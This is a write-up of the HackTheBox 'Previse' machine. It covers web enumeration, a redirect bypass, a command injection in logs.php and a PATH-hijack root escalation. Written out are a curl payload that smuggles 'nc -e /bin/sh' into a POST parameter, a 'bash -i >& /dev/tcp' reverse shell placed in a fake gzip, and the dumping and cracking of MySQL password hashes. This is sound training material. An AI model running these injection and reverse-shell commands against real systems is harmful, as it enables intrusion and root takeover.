---
title: "Walk-through of Previse from HackTheBox"
header:
  teaser: /assets/images/2021-09-29-17-12-44.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Feroxbuster
  - MySQL
  - JohnTheRipper
---

## Machine Information

![previse](/assets/images/2021-09-29-17-12-44.png)

Previse is rated as an easy machine on HackTheBox. An initial scan reveals just two open ports. We start by looking at the website on port 80, and find hidden files by enumerating. We gain access to an account creation page by changing response codes, and then download backup files with our newly gained access. Code review reveals a vulnerability in the website that we use via parameter tampering to gain a reverse shell. Credentials dumped from MySQL are cracked and used to login as a user. Then an unquoted path in a script is exploited to gain a root shell.

<!--more-->

Skills required are web and OS enumeration. Skills learned are changing response codes and parameter tampering.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Previse](https://www.hackthebox.eu/home/machines/profile/373) |
| Machine Release Date | 7th August 2021 |
| Date I Completed It | 4nd October 2021 |
| Distribution Used | Kali 2021.2 – [Release Info](https://www.kali.org/blog/kali-linux-2021-2-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/previse]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.104 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/previse]
└─# nmap -p$ports -sC -sV -oA previse 10.10.11.104

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-29 20:36 BST
Nmap scan report for 10.10.11.104
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

All we get from the nmap scan is a website on port 80 to look at for now:

![previse-website](/assets/images/2021-09-29-20-45-19.png)

## File Discovery

This is a simple static login page. Nothing interesting in the source code, time for feroxbuster:

```sh
┌──(root💀kali)-[~/htb/previse]
└─# feroxbuster -u http://10.10.11.104 -x pdf -x js,html -x php txt json,docx

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.104
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [pdf, js, html, php, txt, json, docx]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      310c http://10.10.11.104/css
301        9l       28w      309c http://10.10.11.104/js
302        0l        0w        0c http://10.10.11.104/logout.php
302      130l      317w     6084c http://10.10.11.104/files.php
302        0l        0w        0c http://10.10.11.104/logs.php
200        0l        0w        0c http://10.10.11.104/config.php
302       71l      164w     2801c http://10.10.11.104/index.php
200       53l      138w     2224c http://10.10.11.104/login.php
302       93l      238w     3994c http://10.10.11.104/accounts.php
302        0l        0w        0c http://10.10.11.104/download.php
200       31l       60w     1248c http://10.10.11.104/nav.php
200       20l       64w      980c http://10.10.11.104/header.php
200        5l       14w      217c http://10.10.11.104/footer.php
302       74l      176w     2971c http://10.10.11.104/status.php
403        9l       28w      277c http://10.10.11.104/server-status
[####################] - 2m    719976/719976  0s      found:15      errors:0      
[####################] - 2m    239992/239992  1443/s  http://10.10.11.104
[####################] - 2m    239992/239992  1441/s  http://10.10.11.104/css
[####################] - 2m    239992/239992  1443/s  http://10.10.11.104/js
```

We've found a number of php files. Looking through those with a 200 response code, only nav.php is interesting:

![previse-nav](/assets/images/2021-09-29-20-58-37.png)

## Altering Response Codes

All links redirect us to the login page, but if we click on the Create Account link and intercept with Burp then set to intercept response:

![previse-intercept](/assets/images/2021-09-29-21-08-18.png)

Now when we click forward to send the get request we capture this response:

```text
HTTP/1.1 302 Found
Date: Wed, 29 Sep 2021 20:08:28 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 3994
Connection: close
Content-Type: text/html; charset=UTF-8
```

A 302 Found response is described [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302):

```text
The HyperText Transfer Protocol (HTTP) 302 Found redirect status
response code indicates that the resource requested has been
temporarily moved to the URL given by the Location header.
```

So we are being redirected to the login.php but we can change the response code to 200 OK instead:

```text
HTTP/1.1 200 OK
Date: Wed, 29 Sep 2021 20:08:28 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 3994
Connection: close
Content-Type: text/html; charset=UTF-8
```

Now when we send that response in Burp we can switch back to the browser to see the accounts.php page:

![previse-create-account](/assets/images/2021-09-29-21-11-29.png)

## Account Creation

We can create an account and then login, which gets us to here:

![previse-logged-in](/assets/images/2021-09-29-21-13-13.png)

Clicking around I found the files page:

![previse-files](/assets/images/2021-09-29-21-20-29.png)

## Backup Files

Downloading the backup file and extracting contents gets us all the files from the site:

```sh
┌──(root💀kali)-[~/htb/previse]
└─# unzip siteBackup.zip 
Archive:  siteBackup.zip
  inflating: accounts.php            
  inflating: config.php              
  inflating: download.php            
  inflating: file_logs.php           
  inflating: files.php               
  inflating: footer.php              
  inflating: header.php              
  inflating: index.php               
  inflating: login.php               
  inflating: logout.php              
  inflating: logs.php                
  inflating: nav.php                 
  inflating: status.php              
``` 

My eyes are drawn to the config.php file, this contains credentials:

```php
┌──(root💀kali)-[~/htb/previse]
└─# cat config.php 
<?php
function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = '<HIDDEN>';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}
?>
```

The logs file is also interesting:

```php
┌──(root💀kali)-[~/htb/previse]
└─# cat logs.php 
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
} 
?>
```

We can see that the script is using the exec function to call python, which then executes a python script, and it takes the parameter delim from the user. We can test this from the command line:

```text
┌──(root💀kali)-[~/htb/previse]
└─# curl -v --cookie "PHPSESSID=1ovoh21p24c94mggubgc3j16dn" -d delim=comma http://previse.htb/logs.php
*   Trying 10.10.11.104:80...
* Connected to previse.htb (10.10.11.104) port 80 (#0)
> POST /logs.php HTTP/1.1
> Host: previse.htb
> User-Agent: curl/7.74.0
> Accept: */*
> Cookie: PHPSESSID=1ovoh21p24c94mggubgc3j16dn
> Content-Length: 11
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 11 out of 11 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Wed, 29 Sep 2021 20:35:55 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Expires: 0
< Cache-Control: must-revalidate
< Pragma: public
< Content-Description: File Transfer
< Content-Disposition: attachment; filename="out.log"
< Content-Length: 379
< Content-Type: application/octet-stream
< 
time,user,fileID
1632935648,admin,34
1632938455,admin,36
<SNIP>
1632944911,admin,32
1632946599,pencer,32
1632946660,pencer,32
* Connection #0 to host previse.htb left intact
```

## Parameter Tampering

We can see that works and I get the comma separated list back. We can abuse this lack of sanitizing input to get a reverse shell. Start netcat listening in another terminal, then use a simple reverse shell which has been URL encoded:

```text
┌──(root💀kali)-[~/htb/previse]
└─# curl -v --cookie "PHPSESSID=1ovoh21p24c94mggubgc3j16dn" -d delim=comma%26nc+-e+/bin/sh+10.10.14.214+1337 http://previse.htb/logs.php 
*   Trying 10.10.11.104:80...
* Connected to previse.htb (10.10.11.104) port 80 (#0)
> POST /logs.php HTTP/1.1
> Host: previse.htb
> User-Agent: curl/7.74.0
> Accept: */*
> Cookie: PHPSESSID=1ovoh21p24c94mggubgc3j16dn
> Content-Length: 45
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 45 out of 45 bytes
```

Switching to our waiting netcat listener and we see we have our shell connected:

```text
┌──(root💀kali)-[~/htb/previse]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.214] from (UNKNOWN) [10.10.11.104] 48260
```

Let's upgrade to a better shell first:

```text
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@previse:/var/www/html$ 
```

## MySQL Enumeration

We are only connected as a low privilege user, but earlier we found mysql credentials so we can have a look in the database:

```text
www-data@previse:/var/www/html$ mysql -u root -p<HIDDEN> -e 'show databases;'
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+

www-data@previse:/var/www/html$ mysql -u root -p<HIDDEN> -e 'show tables from previse;'
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+

www-data@previse:/var/www/html$ mysql -u root -pm<HIDDEN> -D previse -e 'select * from accounts;'
+----+------------+----------------------------------+---------------------+
| id | username   | password                         | created_at          |
+----+------------+----------------------------------+---------------------+
|  1 | m4lwhere   | $1$🧂llol$<HIDDEN>               | 2021-05-27 18:18:36 |
|  2 | admin      | $1$🧂llol$<HIDDEN>               | 2021-09-29 13:25:13 |
<SNIP>
| 11 | pencer     | $1$🧂llol$autWM2CFiLP91dbtPvQwc/ | 2021-09-29 20:12:34 |
+----+------------+----------------------------------+---------------------+
```

## Hash Cracking

We have users and password hashes. The first user called m4lwhere was seen on the site earlier as the creator, let's take that hash and see if we can crack it:

```text
┌──(root💀kali)-[~/htb/previse]
└─# echo "\$1\$🧂llol<HIDDEN>" > hash.txt
```

Use [this](https://vk9-sec.com/cracking-password-john-the-ripper/) site to identify the hash type, which is md5:

```text
┌──(root💀kali)-[~/htb/previse]
└─# john hash.txt -format=md5crypt-long -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN> (?)
1g 0:00:06:16 DONE (2021-09-29 22:17) 0.002653g/s 19671p/s 19671c/s 19671C/s ilovecodydean..ilovecody..
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## User Flag

Now we have creds we can login in via SSH:

```text
┌──(root💀kali)-[~/htb/previse]
└─# ssh m4lwhere@previse.htb                        
The authenticity of host 'previse.htb (10.10.11.104)' can't be established.
ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'previse.htb,10.10.11.104' (ECDSA) to the list of known hosts.
m4lwhere@previse.htb's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)
Last login: Wed Sep 29 18:53:44 2021 from 10.10.14.191
m4lwhere@previse:~$
```

Let's grab the user flag:

```text
m4lwhere@previse:~$ cat user.txt
<HIDDEN>
```

## Privilege Escalation

And first thing I check before anything else is sudo permissions:

```text
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
```

Not too surprisingly we find our escalation path. Looking at the script:

```text

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

We see it's simply zipping up logs, but there is no path to the gzip executable so we can create our own gzip file and use that instead:

```text
m4lwhere@previse:~$ echo "bash -i >& /dev/tcp/10.10.14.214/444 0>&1" > gzip
m4lwhere@previse:~$ chmod 777 gzip
m4lwhere@previse:~$ export PATH=$(pwd):$PATH
m4lwhere@previse:~$ echo $PATH
/home/m4lwhere:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Here we've just created a file called gzip in the current folder which has a reverse shell in it. Then I've made it executable and added the current folder to the system path.

## Root Flag

Now we can run the backup script as root, with another netcat waiting in a different terminal:

```
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
```

Switching across we see we have our shell connected as root:

```text
┌──(root💀kali)-[~]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.214] from (UNKNOWN) [10.10.11.104] 55386
root@previse:~# id 
id
uid=0(root) gid=0(root) groups=0(root)
```

We can grab the root flag:

```text
root@previse:~# cat /root/root.txt
cat /root/root.txt
<HIDDEN>
```

And that's another box completed. I hope you enjoyed this pretty simple one. See you next time.
